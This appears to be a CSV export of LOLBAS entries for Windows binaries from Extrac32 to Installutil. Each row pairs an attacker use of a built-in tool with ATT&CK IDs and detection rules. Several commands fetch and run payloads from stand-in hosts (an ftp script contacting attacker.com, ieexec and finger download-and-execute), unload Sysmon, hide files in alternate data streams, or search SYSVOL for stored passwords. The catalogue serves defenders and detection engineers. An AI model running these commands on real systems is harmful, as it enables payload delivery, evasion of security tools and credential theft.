Filename,Description,Author,Date,Command,Command Description,Command Usecase,Command Category,Command Privileges,MITRE ATT&CK technique,Operating System,Paths,Detections,Resources,Acknowledgements,URL
"Extrac32.exe","Extract to ADS, copy or overwrite a file with Extrac32.exe","Oddvar Moe","2018-05-25","extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe","Command for copying calc.exe to another folder","Copy file","Copy","User","T1105","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\extrac32.exe, C:\Windows\SysWOW64\extrac32.exe","Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml, Sigma: https://github.com/SigmaHQ/sigma/blob/0f33cbc85bf4b23b8d8308bfcc8b21a9e5431ee7/rules/windows/process_creation/win_pc_lolbas_extrac32.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/0f33cbc85bf4b23b8d8308bfcc8b21a9e5431ee7/rules/windows/process_creation/win_pc_lolbas_extrac32_ads.yml","https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/, https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f, https://twitter.com/egre55/status/985994639202283520","egre55 (@egre55), Oddvar Moe (@oddvarmoe), Hai Vaknin(Lux (@VakninHai), Tamir Yehuda (@tim8288)","http://localhost:4001/lolbas/Binaries/Extrac32/"
"Findstr.exe","Write to ADS, discover, or download files with Findstr.exe","Oddvar Moe","2018-05-25","findstr /V /L W3AllLov3LolBas c:\ADS\file.exe > c:\ADS\file.txt:file.exe","Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.","Add a file to an alternate data stream to hide from defensive counter measures","ADS","User","T1564.004","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\findstr.exe, C:\Windows\SysWOW64\findstr.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_findstr.yml","https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/, https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f","Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Findstr/"
"Findstr.exe","Write to ADS, discover, or download files with Findstr.exe","Oddvar Moe","2018-05-25","findstr /V /L W3AllLov3LolBas \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe","Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.","Add a file to an alternate data stream from a webdav server to hide from defensive counter measures","ADS","User","T1564.004","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\findstr.exe, C:\Windows\SysWOW64\findstr.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_findstr.yml","https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/, https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f","Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Findstr/"
"Findstr.exe","Write to ADS, discover, or download files with Findstr.exe","Oddvar Moe","2018-05-25","findstr /S /I cpassword \\sysvol\policies\*.xml","Search for stored password in Group Policy files stored on SYSVOL.","Find credentials stored in cpassword attrbute","Credentials","User","T1552.001","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\findstr.exe, C:\Windows\SysWOW64\findstr.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_findstr.yml","https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/, https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f","Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Findstr/"
"Findstr.exe","Write to ADS, discover, or download files with Findstr.exe","Oddvar Moe","2018-05-25","findstr /V /L W3AllLov3LolBas \\webdavserver\folder\file.exe > c:\ADS\file.exe","Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file.","Download/Copy file from webdav server","Download","User","T1185","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\findstr.exe, C:\Windows\SysWOW64\findstr.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_findstr.yml","https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/, https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f","Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Findstr/"
"Finger.exe","Displays information about a user or users on a specified remote computer that is running the Finger service or daemon","Ruben Revuelta","2021-08-30","finger user@example.host.com | more +2 | cmd","Downloads payload from remote Finger server. This example connects to ""example.host.com"" asking for user ""user""; the result could contain malicious shellcode which is executed by the cmd process.","Download malicious payload","Download","User","T1105","Windows 8.1, Windows 10, Windows 11, Windows Server 2008, Windows Server 2008R2, Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019, Windows Server 2022","c:\windows\system32\finger.exe, c:\windows\syswow64\finger.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_finger_usage.yml, IOC: finger.exe should not be run on a normal workstation., IOC: finger.exe connecting to external resources.","https://twitter.com/DissectMalware/status/997340270273409024, https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961508(v=ws.11)","Ruben Revuelta (MAPFRE CERT) (@rubn_RB), Jose A. Jimenez (MAPFRE CERT) (@Ocelotty6669), Malwrologist (@DissectMalware)","http://localhost:4001/lolbas/Binaries/Finger/"
"fltMC.exe","Filter Manager Control Program used by Windows","John Lambert","2021-09-18","fltMC.exe unload SysmonDrv","Unloads a driver used by security agents","Defense evasion","Tamper","Admin","T1562.001","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\fltMC.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/c27084dd0c432335fa4369e5002a61dfe0ab9c65/rules/windows/process_creation/win_sysmon_driver_unload.yml, Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_via_filter_manager.toml, Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/unload_sysmon_filter_driver.yml, IOC: 4688 events with fltMC.exe","https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon","Carlos Perez (@Carlos_Perez)","http://localhost:4001/lolbas/Binaries/FltMC/"
"Forfiles.exe","Selects and executes a command on a file or set of files. This command is useful for batch processing.","Oddvar Moe","2018-05-25","forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe","Executes calc.exe since there is a match for notepad.exe in the c:\windows\System32 folder.","Use forfiles to start a new process to evade defensive counter measures","Execute","User","T1202","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\forfiles.exe, C:\Windows\SysWOW64\forfiles.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_indirect_cmd.yml","https://twitter.com/vector_sec/status/896049052642533376, https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f, https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/","Eric (@vector_sec), Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Forfiles/"
"Forfiles.exe","Selects and executes a command on a file or set of files. This command is useful for batch processing.","Oddvar Moe","2018-05-25","forfiles /p c:\windows\system32 /m notepad.exe /c ""c:\folder\normal.dll:evil.exe""","Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\windows\system32 folder.","Use forfiles to start a new process from a binary hidden in an alternate data stream","ADS","User","T1564.004","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\forfiles.exe, C:\Windows\SysWOW64\forfiles.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_indirect_cmd.yml","https://twitter.com/vector_sec/status/896049052642533376, https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f, https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/","Eric (@vector_sec), Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Forfiles/"
"Ftp.exe","A binary designed for connecting to FTP servers","Oddvar Moe","2018-12-10","echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt","Executes the commands you put inside the text file.","Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand","Execute","User","T1202","Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\ftp.exe, C:\Windows\SysWOW64\ftp.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_ftp.yml, IOC: cmd /c as child process of ftp.exe","https://twitter.com/0xAmit/status/1070063130636640256, https://medium.com/@0xamit/lets-talk-about-security-research-discoveries-and-proper-discussion-etiquette-on-twitter-10f9be6d1939, https://ss64.com/nt/ftp.html, https://www.asafety.fr/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/","Casey Smith (@subtee), BennyHusted, Amit Serper (@0xAmit)","http://localhost:4001/lolbas/Binaries/Ftp/"
"Ftp.exe","A binary designed for connecting to FTP servers","Oddvar Moe","2018-12-10","cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""","Download","Spawn new process using ftp.exe. Ftp.exe downloads the binary.","Download","User","T1105","Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\ftp.exe, C:\Windows\SysWOW64\ftp.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_ftp.yml, IOC: cmd /c as child process of ftp.exe","https://twitter.com/0xAmit/status/1070063130636640256, https://medium.com/@0xamit/lets-talk-about-security-research-discoveries-and-proper-discussion-etiquette-on-twitter-10f9be6d1939, https://ss64.com/nt/ftp.html, https://www.asafety.fr/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/","Casey Smith (@subtee), BennyHusted, Amit Serper (@0xAmit)","http://localhost:4001/lolbas/Binaries/Ftp/"
"Gpscript.exe","Used by group policy to process scripts","Oddvar Moe","2018-05-25","Gpscript /logon","Executes logon scripts configured in Group Policy.","Add local group policy logon script to execute file and hide from defensive counter measures","Execute","Administrator","T1218","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\gpscript.exe, C:\Windows\SysWOW64\gpscript.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/35a7244c62820fbc5a832e50b1e224ac3a1935da/rules/windows/process_creation/proc_creation_win_lolbin_gpscript.yml, IOC: Scripts added in local group policy, IOC: Execution of Gpscript.exe after logon","https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/","Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Gpscript/"
"Gpscript.exe","Used by group policy to process scripts","Oddvar Moe","2018-05-25","Gpscript /startup","Executes startup scripts configured in Group Policy","Add local group policy logon script to execute file and hide from defensive counter measures","Execute","Administrator","T1218","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\gpscript.exe, C:\Windows\SysWOW64\gpscript.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/35a7244c62820fbc5a832e50b1e224ac3a1935da/rules/windows/process_creation/proc_creation_win_lolbin_gpscript.yml, IOC: Scripts added in local group policy, IOC: Execution of Gpscript.exe after logon","https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/","Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Gpscript/"
"Hh.exe","Binary used for processing chm files in Windows","Oddvar Moe","2018-05-25","HH.exe http://some.url/script.ps1","Open the target PowerShell script with HTML Help.","Download files from url","Download","User","T1105","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\hh.exe, C:\Windows\SysWOW64\hh.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_hh_chm.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_html_help_spawn.yml, Elastic: https://github.com/elastic/detection-rules/blob/ef7548f04c4341e0d1a172810330d59453f46a21/rules/windows/execution_via_compiled_html_file.toml, Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/execution_html_help_executable_program_connecting_to_the_internet.toml, Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_spawn_child_process.yml, Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_url_in_command_line.yml","https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/","Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Hh/"
"Hh.exe","Binary used for processing chm files in Windows","Oddvar Moe","2018-05-25","HH.exe c:\windows\system32\calc.exe","Executes calc.exe with HTML Help.","Execute process with HH.exe","Execute","User","T1218.001","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\hh.exe, C:\Windows\SysWOW64\hh.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_hh_chm.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_html_help_spawn.yml, Elastic: https://github.com/elastic/detection-rules/blob/ef7548f04c4341e0d1a172810330d59453f46a21/rules/windows/execution_via_compiled_html_file.toml, Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/execution_html_help_executable_program_connecting_to_the_internet.toml, Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_spawn_child_process.yml, Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_url_in_command_line.yml","https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/","Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Hh/"
"IMEWDBLD.exe","Microsoft IME Open Extended Dictionary Module","Wade Hickey","2020-03-05","C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw","IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to %LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION> or %LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>","Download file from Internet","Download","User","T1105","Windows 10, Windows 11","C:\Windows\System32\IME\SHARED\IMEWDBLD.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/network_connection/net_connection_win_imewdbld.yml","https://twitter.com/notwhickey/status/1367493406835040265","Wade Hickey (@notwhickey)","http://localhost:4001/lolbas/Binaries/IMEWDBLD/"
"Ie4uinit.exe","Executes commands from a specially prepared ie4uinit.inf file.","Oddvar Moe","2018-05-25","ie4uinit.exe -BaseSettings","Executes commands from a specially prepared ie4uinit.inf file.","Get code execution by copy files to another location","Execute","User","T1218","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","c:\windows\system32\ie4uinit.exe, c:\windows\sysWOW64\ie4uinit.exe, c:\windows\system32\ieuinit.inf, c:\windows\sysWOW64\ieuinit.inf","IOC: ie4uinit.exe copied outside of %windir%, IOC: ie4uinit.exe loading an inf file (ieuinit.inf) from outside %windir%, Sigma: https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/process_creation/proc_creation_win_lolbin_ie4uinit.yml","https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/","Jimmy (@bohops)","http://localhost:4001/lolbas/Binaries/Ie4uinit/"
"Ieexec.exe","The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.","Oddvar Moe","2018-05-25","ieexec.exe http://x.x.x.x:8080/bypass.exe","Downloads and executes bypass.exe from the remote server.","Download and run attacker code from remote location","Download","User","T1105","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10","C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe, C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/a04fbe2a99f1dcbbfeb0ee4957ae4b06b0866254/rules/windows/process_creation/win_possible_applocker_bypass.yml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml, Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml, IOC: Network connections originating from ieexec.exe may be suspicious","https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/","Casey Smith (@subtee)","http://localhost:4001/lolbas/Binaries/Ieexec/"
"Ieexec.exe","The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.","Oddvar Moe","2018-05-25","ieexec.exe http://x.x.x.x:8080/bypass.exe","Downloads and executes bypass.exe from the remote server.","Download and run attacker code from remote location","Execute","User","T1218","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10","C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe, C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/a04fbe2a99f1dcbbfeb0ee4957ae4b06b0866254/rules/windows/process_creation/win_possible_applocker_bypass.yml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml, Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml, IOC: Network connections originating from ieexec.exe may be suspicious","https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/","Casey Smith (@subtee)","http://localhost:4001/lolbas/Binaries/Ieexec/"
"Ilasm.exe","used for compile c# code into dll or exe.","Hai vaknin (lux)","2020-03-17","ilasm.exe C:\public\test.txt /exe","Binary file used by .NET to compile C#/intermediate (IL) code to .exe","Compile attacker code on system. Bypass defensive counter measures.","Compile","User","T1127","Windows 7, Windows 10, Windows 11","C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe, C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe","IOC: Ilasm may not be used often in production environments (such as on endpoints), Sigma: https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/process_creation/proc_creation_win_lolbin_ilasm.yml","https://github.com/LuxNoBulIshit/BeforeCompileBy-ilasm/blob/master/hello_world.txt","Hai Vaknin(Lux) (@VakninHai), Lior Adar","http://localhost:4001/lolbas/Binaries/Ilasm/"
"Ilasm.exe","used for compile c# code into dll or exe.","Hai vaknin (lux)","2020-03-17","ilasm.exe C:\public\test.txt /dll","Binary file used by .NET to compile C#/intermediate (IL) code to dll","A description of the usecase","Compile","User","T1127","Windows 7, Windows 10, Windows 11","C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe, C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe","IOC: Ilasm may not be used often in production environments (such as on endpoints), Sigma: https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/process_creation/proc_creation_win_lolbin_ilasm.yml","https://github.com/LuxNoBulIshit/BeforeCompileBy-ilasm/blob/master/hello_world.txt","Hai Vaknin(Lux) (@VakninHai), Lior Adar","http://localhost:4001/lolbas/Binaries/Ilasm/"
"Infdefaultinstall.exe","Binary used to perform installation based on content inside inf files","Oddvar Moe","2018-05-25","InfDefaultInstall.exe Infdefaultinstall.inf","Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.","Code execution","Execute","Admin","T1218","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\Infdefaultinstall.exe, C:\Windows\SysWOW64\Infdefaultinstall.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/85d47aeabc25bbd023284849f4466c1e00b855ce/rules/windows/process_creation/process_creation_infdefaultinstall.yml, BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules","https://twitter.com/KyleHanslovan/status/911997635455852544, https://blog.conscioushacker.io/index.php/2017/10/25/evading-microsofts-autoruns/, https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/","Kyle Hanslovan (@kylehanslovan)","http://localhost:4001/lolbas/Binaries/Infdefaultinstall/"
"Installutil.exe","The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies","Oddvar Moe","2018-05-25","InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll","Execute the target .NET DLL or EXE.","Use to execute code and bypass application whitelisting","AWL Bypass","User","T1218.004","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe, C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe, C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe, C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/a04fbe2a99f1dcbbfeb0ee4957ae4b06b0866254/rules/windows/process_creation/win_possible_applocker_bypass.yml, Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml","https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/, https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12, https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md, https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/, https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/, https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool","Casey Smith (@subtee), Nir Chako (Pentera) (@C_h4ck_0)","http://localhost:4001/lolbas/Binaries/Installutil/"
"Installutil.exe","The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies","Oddvar Moe","2018-05-25","InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll","Execute the target .NET DLL or EXE.","Use to execute code and bypass application whitelisting","Execute","User","T1218.004","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe, C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe, C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe, C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/a04fbe2a99f1dcbbfeb0ee4957ae4b06b0866254/rules/windows/process_creation/win_possible_applocker_bypass.yml, Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml","https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/, https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12, https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md, https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/, https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/, https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool","Casey Smith (@subtee), Nir Chako (Pentera) (@C_h4ck_0)","http://localhost:4001/lolbas/Binaries/Installutil/"
